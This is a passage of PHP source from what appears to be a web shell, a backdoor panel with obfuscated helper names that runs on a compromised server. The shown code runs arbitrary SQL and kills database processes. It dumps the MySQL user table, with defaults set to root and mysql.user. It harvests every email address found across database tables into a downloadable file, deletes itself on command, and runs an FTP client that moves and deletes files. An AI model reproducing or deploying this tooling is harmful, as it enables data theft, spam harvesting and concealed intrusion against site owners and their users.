                            for ($i = 0; $i < $sql->num_fields; $i++) {
                                echo z9j(z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act", "db_act", "sql_db", "sel_table", "sql_page", "sql_sort" => ($psql_sort[0] == "$i" ? "$i" . ($psql_sort[1] == "a" ? "d" : "a") : "$i" . $psql_sort[1])), z8v(($i == 0 ? "Table " : "") . $sql->columns[$i] . ($psql_sort[0] == "$i" ? ' ' . ($psql_sort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), "13", ($i == 0 ? "2" : ($i == ($sql->num_fields - 1) ? '3' : ''))) . ($i == 0 ? z9j(z9s("369"), "13", "8") : '');
                            }
                            echo z7u();
                            $print_arr = array();
                            for ($i = 0; $i < $sql->num_rows; $i++) {
                                if (@is_array($sql->rows[$i])) {
                                    $tmparr = array();
                                    foreach ($sql->rows[$i] as $rk => $rv) {
                                        $tmparr[] = $rv;
                                    }
                                    $print_arr[] = $tmparr;
                                }
                            }
                            @usort($print_arr, "z3i");
                            if ($psql_sort[1] == "d") {
                                $print_arr = @array_reverse($print_arr);
                            }
                            for ($i = 0; $i < @count($print_arr); $i++) {
                                echo z6g(($i % 2 ? '0' : '1'));
                                $cr = 0;
                                foreach ($print_arr[$i] as $rv) {
                                    echo z9j((@is_null($rv) ? 'NULL' : ($cr == 0 ? "<nobr>" . z5c(array("act" => "sql", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "d", "sql_act" => "table_act", "sql_db", "sel_table" => $rv, "table_act" => "browse"), z8v($rv, "11")) . "</nobr>" : @htmlspecialchars($rv))), "14", ($cr == 0 ? '2' : ($cr == (@count($print_arr[$i]) - 1) ? '3' : '')));
                                    if ($cr == 0) {
                                        echo z9j("<nobr>" . z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "table_act", "sql_db", "sel_table" => $rv), z4a("table_act", $table_actions, "3") . z8v("&raquo;", "6")) . "</nobr>", "14", "8");
                                    }

                                    $cr++;
                                }
                                echo z7u();
                            }
                            echo z10w() . z7g() . z7u() . z10w() . z5j() . z7g() . z7u() . z10w();
                        }
                    }
                }
                if ($sql_act == "query") {
                    echo z2b(z9s("370"));
                    echo z9m("2") . z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "query", "query_confirm" => "1"), z5n() . z7i(z5t(z9s("364")) . z9j(z5u("sql_db", "", "7"))) . z9f(z5t(z9s("370")) . z9j(z5w("sql_query", "5") . (@isset($sql_query) ? @htmlspecialchars($sql_query) : "") . z5q())) . z7i(z5t(z9c()) . z9j(z8v(z9s("371"), "7"))) . z5n()) . z10w();
                    if (@isset($query_confirm) && $query_confirm) {
                        if (@isset($sql_db) && !@empty($sql_db)) {
                            $sql->base = $sql_db;
                            if (!$sql->select_db()) {
                                echo z2b(z9s("447"));
                            }
                        }
                        $q_sql_error = '';
                        $q_sql_result = '';
                        if (@strlen($sql_query) > 5) {
                            $q_sql_result .= z2b(z9s("394"));
                            switch ($sql->query($sql_query)) {
                            case '0':
                                $q_sql_result .= z2b("ERROR : " . $sql->error);
                                break;
                            case '1':
                                if ($sql->get_result()) {
                                    $q_sql_result .= z9m('2') . z7p() . z7k() . z5x('', "0") . z9m("2") . z7p() . z7k();
                                    foreach ($sql->columns as $k => $v) {
                                        $sql->columns[$k] = @htmlspecialchars($v, ENT_QUOTES);
                                    }

                                    $keys = "";
                                    $count_keys = @count($sql->columns);
                                    $key_num = 0;
                                    foreach ($sql->columns as $column) {
                                        if ($key_num == 0) {
                                            $keys .= z9j($column, "13", "02");
                                        } elseif ($key_num == ($count_keys - 1)) {
                                            $keys .= z9j($column, "13", "03");
                                        } else {
                                            $keys .= z9j($column, "13", "0");
                                        }
                                        $key_num++;
                                    }
                                    $q_sql_result .= z7i($keys);
                                    for ($i = 0; $i < $sql->num_rows; $i++) {
                                        foreach ($sql->rows[$i] as $k => $v) {
                                            $sql->rows[$i][$k] = @htmlspecialchars($v, ENT_QUOTES);
                                        }

                                        $values = "";
                                        $count_values = @count($sql->rows[$i]);
                                        $value_num = 0;
                                        foreach ($sql->rows[$i] as $row) {
                                            if ($value_num == 0) {
                                                $values .= z9j($row, "14", "2");
                                            } elseif ($value_num == ($count_values - 1)) {
                                                $values .= z9j($row, "14", "3");
                                            } else {
                                                $values .= z9j($row, "14");
                                            }
                                            $value_num++;
                                        }
                                        $q_sql_result .= z7i($values, ($i % 2 ? '0' : '1'));
                                    }
                                    $q_sql_result .= z7g() . z7u() . z10w() . z5j() . z7g() . z7u() . z10w();
                                }
                                break;
                            case '2':
                                $ar = $sql->affected_rows() ? ($sql->affected_rows()) : ('0');
                                $q_sql_result .= z2b("AFFECTED ROWS: " . $ar);
                                break;
                            }
                        }
                        if ($q_sql_result != '') {
                            echo $q_sql_result;
                            $q_sql_result = '';
                        }
                    }
                }
                if ($sql_act == "emails") {
                    $emails = array();
                    if (!@isset($emails_filename)) {
                        $emails_filename = $tempdir . "emails_" . @getenv("SERVER_NAME") . "_db_" . @date("d-m-Y_H-i-s") . ".txt";
                    }
                    if (@isset($sql_db) && !@empty($sql_db)) {
                        $sql->base = $sql_db;
                        if ($sql->select_db()) {
                            $table_list = array();
                            $sql->query('SHOW TABLES FROM ' . $sql_db . ';');
                            if ($sql->get_result()) {
                                for ($i = 0; $i < $sql->num_rows; $i++) {
                                    foreach ($sql->rows[$i] as $rk => $rv) {
                                        $table_list[] = $rv;
                                    }
                                }
                            }
                        }
                    }
                    if (!@isset($sql_tables) || @empty($sql_tables)) {
                        if (@isset($sel_table) && !@empty($sel_table)) {
                            $sql_tables = $sel_table;
                        } else {
                            $sql_tables = (@count($table_list) > 0 ? @implode(",", $table_list) : "");
                        }
                    } elseif (@isset($table_list) && @is_array($table_list)) {
                        $tmp_tables = @explode(",", $sql_tables);
                        $sql_tables = "";
                        foreach ($tmp_tables as $tmp_table) {
                            $tmp_table = @trim($tmp_table);
                            if (@in_array($tmp_table, $table_list)) {
                                $sql_tables .= $tmp_table . ",";
                            } else {
                                break;
                            }
                        }
                        if (@empty($sql_tables)) {
                            $sql_tables = @implode(",", $table_list);
                        }
                    }
                    echo z2b(z9s("372"));
                    echo z9m("2") . z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "emails", "dump_confirm" => "1"), z5n() . z7i(z5t(z9s("364")) . z9j(z4a("sql_db", $db_list, "7", 1))) . z7i(z5t(z9s("373")) . z9j(z5w("sql_tables", "5") . (@isset($sql_tables) ? @htmlspecialchars($sql_tables) : "") . z5q())) . z7i(z5t(z9s("374")) . z9j(z5u("emails_filename", $emails_filename, "7"))) . z7i(z5t(z9c()) . z9j(z5y("sql_save2file", z9s("375"), "sql_save2file") . z9c() . z5y("sql_download", z9s("376"), "sql_download"))) . z7i(z5t(z9c()) . z9j(z8v(z9s("377"), "7"))) . z5n()) . z10w();
                    if (@isset($dump_confirm) && $dump_confirm) {
                        $fp = 0;
                        if (@isset($sql_save2file) && $sql_save2file == "1" && @isset($dump_filename) && !@empty($dump_filename)) {
                            $fp = @fopen($emails_filename, "w");
                        }
                        $dumping_arr = array();
                        $tmp_tables = @explode(",", $sql_tables);
                        foreach ($tmp_tables as $tmp_table) {
                            $tmp_table = @trim($tmp_table);
                            $dumping_arr[] = $tmp_table;
                        }
                        $dumping_arr = @array_unique($dumping_arr);
                        $sql->base = $sql_db;
                        if (!$sql->select_db()) {
                            echo z2b(z9s("447"));
                        } elseif (@count($dumping_arr) < 1) {
                            echo z2b(z9s("448"));
                        } else {
                            foreach ($dumping_arr as $dump_table) {
                                if ($sql->parse_fields($dump_table)) {
                                    foreach ($sql->columns as $ck => $cv) {
                                        if ($sql->query("SELECT " . $cv . " FROM " . $dump_table . " WHERE " . $cv . " REGEXP '^[^@]+@[^@]+\.[^@]{2,}$';")) {
                                            if ($sql->get_result()) {
                                                for ($i = 0; $i < $sql->num_rows; $i++) {
                                                    $tmpmails = z3v($sql->rows[$i][$cv]);
                                                    if (@count($tmpmails) > 0) {
                                                        foreach ($tmpmails as $mtmp) {
                                                            $emails[] = $mtmp;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            $emails = @array_unique($emails);
                            if (@count($emails) > 0) {
                                $maildump = @implode("\r\n", $emails);
                                if (@isset($sql_download) && $sql_download == "1") {
                                    @ob_clean();
                                    @header("Content-type: application/octet-stream");
                                    @header("Content-length: " . @strlen($maildump));
                                    @header("Content-disposition: attachment; filename=\"" . @basename($emails_filename) . "\";");
                                    echo $maildump;
                                    exit();
                                }
                                if (!@isset($sql_save2file) || $sql_save2file != "1") {
                                    echo z9m('2') . z6g() . z6w() . z5w('', '1') . @htmlspecialchars($maildump) . z5q() . z7g() . z7u() . z10w() . z6d();
                                } elseif ($fp || @function_exists('file_put_contents')) {
                                    if (@fwrite($fp, $maildump) or @fputs($fp, $maildump) or @file_put_contents($emails_filename, $maildump)) {
                                        echo z2b(z9s("449", $emails_filename));
                                    } else {
                                        echo z2b(z9s("450"));
                                    }
                                } else {
                                    echo z2b(z9s("450"));
                                }
                            }
                        }
                    }
                }
                if ($sql_act == "serverstatus") {
                    echo z2b(z9s("378"), "1");
                    $sql->query("SHOW STATUS");
                    if ($sql->get_result()) {
                        echo z9m('2') . z7i(z9j(z9s("380"), "13", "2") . z9j(z9s("381"), "13", "3"));
                        for ($i = 0; $i < $sql->num_rows; $i++) {
                            echo z6g(($i % 2 ? '0' : '1'));
                            $cr = 0;
                            foreach ($sql->rows[$i] as $rk => $rv) {
                                echo z9j($rv, "14", ($cr == 0 ? '25' : ($cr == (@count($sql->rows[$i]) - 1) ? '3' : '')));
                                $cr++;
                            }
                            echo z7u();
                        }
                        echo z10w();
                    }
                }
                if ($sql_act == "servervars") {
                    echo z2b(z9s("379"), "1");
                    $sql->query("SHOW VARIABLES");
                    if ($sql->get_result()) {
                        echo z9m('2') . z7i(z9j(z9s("380"), "13", "2") . z9j(z9s("381"), "13", "3"));
                        for ($i = 0; $i < $sql->num_rows; $i++) {
                            echo z6g(($i % 2 ? '0' : '1'));
                            $cr = 0;
                            foreach ($sql->rows[$i] as $rk => $rv) {
                                echo z9j($rv, "14", ($cr == 0 ? '25' : ($cr == (@count($sql->rows[$i]) - 1) ? '3' : '')));
                                $cr++;
                            }
                            echo z7u();
                        }
                        echo z10w();
                    }
                }
                if ($sql_act == "processes") {
                    if (@isset($kill) && !@empty($kill)) {
                        $query = "KILL " . $kill . ";";
                        $sql->query($query);
                        echo z2b(z9s("393", $kill), "1");
                    } else {
                        echo z2b(z9s("382"), "1");
                    }
                    $sql->query("SHOW PROCESSLIST;");
                    if ($sql->get_result()) {
                        echo z9m('2') . z7i(z9j(z9s("383"), "13", "2") . z9j(z9s("384"), "13") . z9j(z9s("385"), "13") . z9j(z9s("386"), "13") . z9j(z9s("387"), "13") . z9j(z9s("388"), "13") . z9j(z9s("389"), "13") . z9j(z9s("390"), "13") . z9j(z9s("391"), "13", "3"));
                        for ($i = 0; $i < $sql->num_rows; $i++) {
                            echo z6g(($i % 2 ? '0' : '1'));
                            $cr = 0;
                            $pid = '';
                            foreach ($sql->rows[$i] as $rk => $rv) {
                                echo z9j($rv, "14", ($cr == 0 ? '5' : ''));
                                if ($cr == 0) {
                                    $pid = $rv;
                                }

                                $cr++;
                            }
                            echo z9j(z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "processes", "kill" => $pid), z8v(z9s("392"), "7")), "14");
                            echo z7u();
                        }
                        echo z10w();
                    }
                }
                if ($sql_act == "showdb") {
                    $psql_sort = z5r($sql_sort);
                    if ($psql_sort[1] != 'a') {
                        $psql_sort[1] = 'd';
                    }
                    if ($psql_sort[0] > 2) {
                        $psql_sort[0] = '0';
                    }

                    $v = $psql_sort[0];
                    echo z2b(z9s("359"), "1");
                    echo z9m('2');
                    echo z7i(z9j(z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_sort" => ($psql_sort[0] == '0' ? '0' . ($psql_sort[1] == "a" ? "d" : "a") : '0' . $psql_sort[1])), z8v(z9s("360") . ($psql_sort[0] == '0' ? ' ' . ($psql_sort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), "13", "2") . z9j(z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_sort" => ($psql_sort[0] == '1' ? '1' . ($psql_sort[1] == "a" ? "d" : "a") : '1' . $psql_sort[1])), z8v(z9s("361") . ($psql_sort[0] == '1' ? ' ' . ($psql_sort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), "13") . z9j(z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_sort" => ($psql_sort[0] == '2' ? '2' . ($psql_sort[1] == "a" ? "d" : "a") : '2' . $psql_sort[1])), z8v(z9s("362") . ($psql_sort[0] == '2' ? ' ' . ($psql_sort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), "13") . z9j(z9s("363"), "13", "3"));
                    if (@count($db_list) > 1) {
                        $def_db = $sql->base;
                        $total_tables = 0;
                        $total_size = 0;
                        $print_arr = array();
                        foreach ($sql->list_dbs() as $k => $kv) {
                            $sql->base = $k;
                            $tables = "0";
                            $size = "0";
                            if ($sql->select_db()) {
                                $sql->query("SHOW TABLES;");
                                if ($sql->get_result()) {
                                    $tables = $sql->num_rows;
                                }

                                $sql->query("SELECT round(data_length + index_length) FROM information_schema.TABLES WHERE table_schema = \"" . $k . "\";");
                                if ($sql->get_result()) {
                                    $size = @implode('', $sql->rows[0]);
                                }
                            }
                            $print_arr[] = array($k, $size, $tables);
                            $total_tables += $tables;
                            $total_size += $size;
                        }
                        $sql->base = $def_db;
                        $sql->select_db();
                    }
                    if (@count($print_arr) > 0) {
                        $count = 0;
                        @usort($print_arr, "z3i");
                        if ($psql_sort[1] == "d") {
                            $print_arr = @array_reverse($print_arr);
                        }
                        foreach ($print_arr as $ar) {
                            echo z7i(z9j(z5c(array("act" => "sql", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "db_act", "db_act" => "select", "d", "sql_db" => $ar[0]), z8v($ar[0], "11")), "14", "2") . z9j(z7c($ar[1]), "14") . z9j($ar[2], "14") . z9j("<nobr>" . z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "db_act", "sql_db" => $ar[0]), z4a("db_act", $db_actions, "3") . z8v("&raquo;", "6")) . "</nobr>", "14", "38"), ($count % 2 ? '0' : '1'));
                            $count++;
                        }
                        echo z7i(z9j(z8e(z9s("409", $count)), "13", "2") . z9j(z7c($total_size), "13") . z9j($total_tables, "13") . z9j(z9c(), "13", "3"));
                    }
                    echo z10w();
                }
            }
        } else {
            $hmsg = z9s("191");
        }
    }
    if (!$hideconnect) {
        if (!@isset($q_sql_query)) {
            $q_sql_query = "SHOW DATABASES;\nSELECT * FROM user;";
        }
        if (!@isset($q_sql_filename)) {
            $q_sql_filename = $tempdir . "dump_" . @getenv("SERVER_NAME") . "_db_" . @date("d-m-Y_H-i-s") . ".sql";
        }

        $available_arr = array();
        if ($bmysql) {
            $available_arr["MySQL"] = "MySQL";
        }
        if ($bmssql) {
            $available_arr["MSSQL"] = "MSSQL";
        }
        if ($bpostgres) {
            $available_arr["PostgreSQL"] = "PostgreSQL";
        }
        if ($boracle) {
            $available_arr["Oracle"] = "Oracle";
        }

        echo z2b(z9s("451") . ($hmsg != '' ? ' : ' . $hmsg : ''));
        echo z9m('2') . z5c(array("act" => "sql", "d"), z5n() . z7i(z7e(z8e(z9s("452"))) . z7l(z5u("sql_server", "127.0.0.1", "4") . ":" . z5u("sql_port", "3306", "1")) . z7e(z8e(z9s("453"))) . z7l(z5u("sql_user", "root", "4")) . z7e(z8e(z9s("454"))) . z7l(z5u("sql_pass", "", "4")) . z7e(z8e(z9s("455"))) . z7l(z5u("sql_db", "", "4")) . z7e(z8e(z9s("456"))) . z7l(z4a("sql_engine", array("MySQL" => "MySQL"), "4", 1) . z8v(z9s("457"), "7")))) . z10w();
        echo z6d();
        echo z2b(array(z9s("410"), z9s("420")), '46');
        echo z9m('2') . z9f(z9j(z5c(array("act" => "sql", "d", "q_sql_action" => "dump"), z9m() . z5n() . z7i(z5t(z9s("411")) . z9j(z4a("q_sql_engine", $available_arr, "4", 1))) . z7i(z5t(z9s("412")) . z9j(z5u("q_sql_server", "127.0.0.1", '4') . ":" . z5u("q_sql_port", "3306", "1"))) . z7i(z5t(z9s("413")) . z9j(z5u("q_sql_user", "root", "4") . ":" . z5u("q_sql_pass", "", "4"))) . z7i(z5t(z9s("414")) . z9j(z5u("q_sql_db", "mysql", "4") . "." . z5u("q_sql_table", "user", "4"))) . z7i(z5t(z9s("415")) . z9j(z5u("q_sql_filename", $q_sql_filename, "8"))) . z7i(z5t(z9c()) . z9j(z5y("q_sql_download", z9s("416"), "q_sql_download"))) . z7i(z5t(z9c()) . z9j(z5y("q_sql_save2file", z9s("417"), "q_sql_save2file"))) . z7i(z5t(z9c()) . z9j(z8v(z9s("418"), "7"))) . z5n() . z10w()), '', '4') . z9j(z5c(array("act" => "sql", "d", "q_sql_action" => "query"), z9m() . z5n() . z7i(z5t(z9s("411")) . z9j(z4a("q_sql_engine", $available_arr, "4", 1))) . z7i(z5t(z9s("412")) . z9j(z5u("q_sql_server", "127.0.0.1", "4") . ":" . z5u("q_sql_port", "3306", "1"))) . z7i(z5t(z9s("413")) . z9j(z5u("q_sql_user", "root", "4") . ":" . z5u("q_sql_pass", "", "4"))) . z7i(z5t(z9s("421")) . z9j(z5u("q_sql_db", "mysql", "4"))) . z9f(z5t(z9s("370")) . z9j(z5w("q_sql_query", "4") . @htmlspecialchars($q_sql_query) . z5q())) . z7i(z5t(z9c()) . z9j(z8v(z9s("422"), "7"))) . z5n() . z10w()), '', "46")) . z10w();
        if (@isset($q_sql_action) && $q_sql_action == "query") {
            $sql = new my_sql();
            $sql->db = $q_sql_engine;
            $sql->host = $q_sql_server;
            $sql->port = $q_sql_port;
            $sql->user = $q_sql_user;
            $sql->pass = $q_sql_pass;
            $sql->base = $q_sql_db;
            $querys = @explode(';', $q_sql_query);
            $q_sql_connect_error = "";
            $q_sql_error = '';
            $q_sql_result = '';
            if (!$sql->connect()) {
                $q_sql_connect_error = z2b(z9s("419"));
            } else {
                if (!empty($sql->base) && !$sql->select_db()) {
                    $q_sql_connect_error = z2b(z9s("447"));
                } else {
                    foreach ($querys as $num => $query) {
                        if (@strlen($query) > 5) {
                            $q_sql_result .= z2b(z9s("423", array($num, @htmlspecialchars($query, ENT_QUOTES))));
                            switch ($sql->query($query)) {
                            case '0':
                                $q_sql_result .= z2b("ERROR : " . $sql->error);
                                break;
                            case '1':
                                if ($sql->get_result()) {
                                    $q_sql_result .= z9m('2') . z7p() . z7k() . z5x('', "0") . z9m("2") . z7p() . z7k();
                                    foreach ($sql->columns as $k => $v) {
                                        $sql->columns[$k] = @htmlspecialchars($v, ENT_QUOTES);
                                    }

                                    $keys = "";
                                    $count_keys = @count($sql->columns);
                                    $key_num = 0;
                                    foreach ($sql->columns as $column) {
                                        if ($key_num == 0) {
                                            $keys .= z9j($column, "13", "02");
                                        } elseif ($key_num == ($count_keys - 1)) {
                                            $keys .= z9j($column, "13", "03");
                                        } else {
                                            $keys .= z9j($column, "13", "0");
                                        }
                                        $key_num++;
                                    }
                                    $q_sql_result .= z7i($keys);
                                    for ($i = 0; $i < $sql->num_rows; $i++) {
                                        foreach ($sql->rows[$i] as $k => $v) {
                                            $sql->rows[$i][$k] = @htmlspecialchars($v, ENT_QUOTES);
                                        }

                                        $values = "";
                                        $count_values = @count($sql->rows[$i]);
                                        $value_num = 0;
                                        foreach ($sql->rows[$i] as $row) {
                                            if ($value_num == 0) {
                                                $values .= z9j($row, "14", "2");
                                            } elseif ($value_num == ($count_values - 1)) {
                                                $values .= z9j($row, "14", "3");
                                            } else {
                                                $values .= z9j($row, "14");
                                            }
                                            $value_num++;
                                        }
                                        $q_sql_result .= z7i($values, ($i % 2 ? '0' : '1'));
                                    }
                                    $q_sql_result .= z7g() . z7u() . z10w() . z5j() . z7g() . z7u() . z10w();
                                }
                                break;
                            case '2':
                                $ar = $sql->affected_rows() ? ($sql->affected_rows()) : ('0');
                                $q_sql_result .= z2b("AFFECTED ROWS: " . $ar);
                                break;
                            }
                        }
                        if ($q_sql_result != '') {
                            echo $q_sql_result;
                            $q_sql_result = '';
                        }
                    }
                }
            }
            if ($q_sql_connect_error != "") {
                echo $q_sql_connect_error;
            }
        }
        if (@isset($q_sql_action) && $q_sql_action == "dump") {
            $fp = 0;
            if (@isset($q_sql_save2file) && $q_sql_save2file == "1" && @isset($q_sql_filename) && !@empty($q_sql_filename)) {
                if (z4q($q_sql_filename)) {
                    @unlink($q_sql_filename);
                }

                $fp = @fopen($q_sql_filename, "a");
            }
            $q_sql_filename = @str_replace("_db_", "_" . $q_sql_db . "_", $q_sql_filename);
            $sql = new my_sql();
            $sql->db = $q_sql_engine;
            $sql->host = $q_sql_server;
            $sql->port = $q_sql_port;
            $sql->user = $q_sql_user;
            $sql->pass = $q_sql_pass;
            $sql->base = $q_sql_db;
            $q_sql_dumped = "";
            if (!$sql->connect()) {
                echo z2b(z9s("419"));
            } elseif (!$sql->select_db()) {
                echo z2b(z9s("447"));
            } elseif (!$sql->dump($q_sql_table)) {
                echo z2b(z9s("458"));
            } else {
                if (@isset($q_sql_download) && $q_sql_download == "1") {
                    @ob_clean();
                    @header("Content-type: application/octet-stream");
                    @header("Content-disposition: attachment; filename=\"" . @basename($q_sql_filename) . "\";");
                    foreach ($sql->dump as $v) {
                        echo $v . "\r\n";
                    }
                    exit();
                }
                if (!@isset($q_sql_save2file) || $q_sql_save2file != "1") {
                    echo z9m('2') . z6g() . z6w() . z5w('', '1');
                    foreach ($sql->dump as $v) {
                        echo @htmlspecialchars($v) . "\r\n";
                    }

                    echo z5q() . z7g() . z7u() . z10w() . z6d();
                } else if ($fp) {
                    foreach ($sql->dump as $v) {
                        if (!@fwrite($fp, $v . "\r\n")) {
                            @fputs($fp, $v . "\r\n");
                        }
                    }
                    if (z4q($q_sql_filename)) {
                        z2b(z9s("459"));
                    } else {
                        echo z2b(z9s("450"));
                    }
                } else {
                    echo z2b(z9s("450"));
                }
            }
        }
    }
}
if ($act == "selfremove") {
    if (@isset($dconfirm) && $dconfirm) {
        if ($saddr != "127.0.0.1") {
            echo z2b((@unlink(__FILE__) ? z9s("462") : z9s("463", __FILE__)));
        }
    } else {
        echo z2b(z9s("460"));
        echo z6d() . z10e(z7i(z6x(z8e(z9s("461")) . z5c(array("act" => "selfremove", "d", "dconfirm" => "1"), z8v(z9s("21"), "7")) . z9c() . z5c($back_form_actions, z8v(z9s("22"), '7')))), "2") . z6d();
    }
}
if ($act == 'ftp') {
    $a_transfer = array("FTP_BINARY" => "FTP_BINARY", "FTP_ASCII" => "FTP_ASCII");
    $hmsg = '';
    $hideconnect = 0;
    $jsid = 0;
    if (@isset($ftp_server) && !@isset($ftp_passive)) {
        $ftp_passive = 0;
    }
    if (!@isset($ftp_server) && !@isset($ftp_passive)) {
        $ftp_passive = "1";
    }
    if (@isset($ft) && $ft == "logoff") {
        if (@isset($_SESSION['ftp_server'])) {
            z0u('ftp_current_dir' . $_SESSION['ftp_server']);
        }
        z0u('ftp_server');
        z0u('ftp_username');
        z0u('ftp_password');
        z0u('ftp_port');
        z0u('ftp_passive');
        z0u('ftp_session');
    }
    $ftp_session = 0;
    if (@isset($_SESSION['ftp_session'])) {
        $ftp_server = $_SESSION['ftp_server'];
        $ftp_username = $_SESSION['ftp_username'];
        $ftp_password = $_SESSION['ftp_password'];
        $ftp_port = $_SESSION['ftp_port'];
        $ftp_passive = $_SESSION['ftp_passive'];
        $ftp_session = 1;
    }
    if (!@empty($ftp_server) && !@empty($ftp_port) && !@empty($ftp_username) && !@empty($ftp_password) && !@isset($ftp_quickaction)) {
        $ftp = new ftp($ftp_server, $ftp_port, $ftp_username, $ftp_password, $ftp_passive);
        if ($ftp->loggedOn) {
            if (!@isset($ftp_current_dir) || @empty($ftp_current_dir)) {
                $ftp_current_dir = z1a((@isset($_SESSION['ftp_current_dir' . $ftp_server]) ? $_SESSION['ftp_current_dir' . $ftp_server] : '/'));
            }
            if (@isset($rd)) {
                $ftp_current_dir = z1a($ftp_current_dir . $rd);
            }

            $ftp->setCurrentDir($ftp_current_dir);
            $ftp_current_dir = $ftp->currentDir;
            $_SESSION['ftp_current_dir' . $ftp_server] = $ftp_current_dir;
            $_SESSION['ftp_server'] = $ftp_server;
            $_SESSION['ftp_username'] = $ftp_username;
            $_SESSION['ftp_password'] = $ftp_password;
            $_SESSION['ftp_port'] = $ftp_port;
            $_SESSION['ftp_passive'] = $ftp_passive;
            $_SESSION['ftp_session'] = 1;
            $hideconnect = 1;
            $hmsg = z5c(array("act" => "ftp", "d", "ft" => "logoff"), z8v(z9s("196"), "1"));
        } else {
            $hmsg = z9s("191");
        }
    }
    if (!@isset($ftp_server) || @empty($ftp_server)) {
        $ftp_server = "127.0.0.1";
    }
    if (!@isset($ftp_port) || @empty($ftp_port)) {
        $ftp_port = "21";
    }
    if (!@isset($ftp_username) || @empty($ftp_username)) {
        $ftp_username = "anonymous";
    }
    if (!@isset($ftp_password) || @empty($ftp_password)) {
        $ftp_password = "anonymous@ftp.com";
    }
    if (!@isset($ftp_localfile) || @empty($ftp_localfile)) {
        $ftp_localfile = $d;
    }
    if (!@isset($ftp_remotefile) || @empty($ftp_remotefile)) {
        $ftp_remotefile = "/ftp-dir/somefile.txt";
    }
    if ($hideconnect) {
        if (@isset($lmkdir) && $lmkdir && @isset($ldir) && !@empty($ldir)) {
            @mkdir($d . $ldir);
        }
        if (@isset($fmkdir) && $fmkdir && @isset($fdir) && !@empty($fdir)) {
            $ftp->makeDir(z1a($ftp_current_dir) . $fdir);
        }
        $ltarr = array();
        $rtarr = array();
        if (@isset($action) && !@empty($action) && (@isset($ltall) || @isset($rtall))) {
            $ft = $action;
            if (@isset($rtall) || @strstr($rtall, "\n")) {
                $rtarr = @explode("\n", $rtall);
            } elseif (@isset($ltall) || @strstr($ltall, "\n")) {
                $ltarr = @explode("\n", $ltall);
            }
        }
        if (@isset($ft)) {
            switch ($ft) {
            case "delete":
                if (@isset($lt) && !@empty($lt) && z4q($lt)) {
                    z8d($lt);
                } elseif (@isset($rt) && !@empty($rt)) {
                    $ftp->deleteObject(z1a($ftp_current_dir) . $rt);
                } elseif (@count($ltarr) > 0) {
                    foreach ($ltarr as $lto) {
                        $lto = @trim($lto);
                        if (!@empty($lto) && z4q($lto)) {
                            z8d($lto);
                        }
                    }
                } elseif (@count($rtarr) > 0) {
                    foreach ($rtarr as $rto) {
                        $rto = @trim($rto);
                        if (!@empty($rto)) {
                            $ftp->deleteObject(z1a($ftp_current_dir) . $rto);
                        }
                    }
                }
                break;
            case "upload":
                if (@isset($lt) && !@empty($lt) && z4q($lt)) {
                    $ftp->putObject($lt, z1a($ftp_current_dir));
                } elseif (@count($ltarr) > 0) {
                    foreach ($ltarr as $lto) {
                        $lto = @trim($lto);
                        if (!@empty($lto) && z4q($lto)) {
                            $ftp->putObject($lto, z1a($ftp_current_dir));
                        }
                    }
                }
                break;
            case "download":
                if (@isset($rt) && !@empty($rt)) {
                    $ftp->getObject(z1a($ftp_current_dir) . $rt, $d);
                } elseif (@count($rtarr) > 0) {
                    foreach ($rtarr as $rto) {
                        $rto = @trim($rto);
                        if (!@empty($rto)) {
                            $ftp->getObject(z1a($ftp_current_dir) . $rto, $d);
                        }
                    }
                }
                break;
            default:
                break;
            }
        }
        $frml = z9s("194") . z9c() . z5c(array('act' => 'ftp', 'd', 'lmkdir' => '1'), z6i('ldir', '', '2') . z8v(z9s("195"), '7'));
        $frmf = z9s("194") . z9c() . z5c(array('act' => 'ftp', 'd', 'fmkdir' => '1'), z6i('fdir', '', '2') . z8v(z9s("195"), '7'));
        echo z2b(array(z10e(z7i(z7l(z9s("192")) . z7e($frml)), '2'), z10e(z7i(z7l(z9s("193") . z9c() . $hmsg) . z7e($frmf)), '2')), '4');
        $listf = $ftp->ftpRawList();
        $listl = z8k($d);
        $lsl = array();
        $lsl["d"] = array();
        $lsl["l"] = array();
        $lsl["f"] = array();
        $lsf = array();
        $lsf["d"] = array();
        $lsf["l"] = array();
        $lsf["f"] = array();
        if (@is_array($listl) && @count($listl) > 0) {
            foreach ($listl as $lf) {
                $fn = z2h($lf);
                if ($fn != '.' && $fn != '..') {
                    if (z4j($lf)) {
                        $lsl["d"][] = array($lf, 'DIR');
                    } elseif (z3j($lf)) {
                        $lsl["l"][] = array($lf, 'LINK');
                    } else {
                        $lsl["f"][] = array($lf, (@filesize($lf) !== false ? @filesize($lf) : 'FILE'));
                    }
                }
            }
        }
        if (@is_array($listf) && @count($listf) > 0) {
            foreach ($listf as $rf) {
                if ($rf[1] != '.' && $rf[1] != '..') {
                    if ($rf[0] == 'd') {
                        $lsf["d"][] = array($rf[1], 'DIR');
                    } elseif ($rf[0] == 'l') {
                        $rfd = (@strstr($rf[1], ' -> ') ? @substr($rf[1], 0, @strpos($rf[1], ' -> ')) : $rf[1]);
                        $lsf['l'][] = array($rfd, 'LINK');
                    } else {
                        $lsf['f'][] = array($rf[1], $rf[2]);
                    }
                }
            }
        }
        if (!@isset($flsort)) {
            if (@isset($_SESSION['flsort'])) {
                $flsort = $_SESSION['flsort'];
            } else {
                $flsort = '0a';
            }
        }
